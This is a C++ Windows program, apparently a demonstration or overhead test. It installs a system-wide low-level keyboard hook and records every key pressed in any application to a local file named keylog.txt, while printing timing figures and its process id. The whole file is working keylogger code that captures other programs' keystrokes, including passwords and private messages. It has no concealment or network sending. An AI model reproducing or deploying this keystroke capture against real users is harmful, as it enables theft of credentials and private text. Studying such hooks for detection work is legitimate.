#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>
#include <thread>
#include <chrono>

HHOOK g_hKeyboardHook = NULL;
HANDLE g_hLogFile = INVALID_HANDLE_VALUE;

// Converts virtual key to printable char (simplified)
std::string VirtualKeyToString(KBDLLHOOKSTRUCT* p)
{
    DWORD msg = 1;
    msg += p->scanCode << 16;
    msg += p->flags << 24;

    char buffer[5];
    if (GetKeyNameTextA(msg, buffer, sizeof(buffer)) != 0)
        return std::string(buffer);
    else
        return "[UNK]";
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION)
    {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            auto start = std::chrono::high_resolution_clock::now();

            std::string keyStr = VirtualKeyToString(pKeyboard);

            // Format and log to file
            std::string log = "[KEY] " + keyStr + "\r\n";
            DWORD written;
            WriteFile(g_hLogFile, log.c_str(), (DWORD)log.size(), &written, NULL);

            auto end = std::chrono::high_resolution_clock::now();

            std::chrono::duration<double, std::micro> duration = end - start;
            double overheadMicroseconds = duration.count();

            std::cout << "[Key: " << keyStr << "] Overhead: "
                << overheadMicroseconds << " microseconds" << std::endl;
        }
    }

    return CallNextHookEx(g_hKeyboardHook, nCode, wParam, lParam);
}

void KeyboardHookThread()
{
    // Install hook
    g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (!g_hKeyboardHook)
    {
        std::cerr << "Failed to install keyboard hook!" << std::endl;
        return;
    }

    // Open the keylog file for writing (overwrite)
    g_hLogFile = CreateFileW(L"keylog.txt", GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_hLogFile == INVALID_HANDLE_VALUE)
    {
        std::cerr << "Failed to open keylog file!" << std::endl;
        return;
    }

    // Message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Cleanup
    UnhookWindowsHookEx(g_hKeyboardHook);
    CloseHandle(g_hLogFile);
}

int main()
{
    // Start the keyboard hook in a new thread
    std::thread hookThread(KeyboardHookThread);
    hookThread.detach();  // Run in background

    std::string value;
    while (true)
    {
        // Output the current process Id
        HANDLE currentThread = GetCurrentThread();
        std::cout << "Process id: ";
        std::cout << GetProcessIdOfThread(currentThread);
        std::cout << "\n";
        CloseHandle(currentThread);

        std::cout << "Press <enter> to Beep (Ctrl-C to exit): ";
        std::getline(std::cin, value);
        Beep(500, 500);
    }

    return 0;
}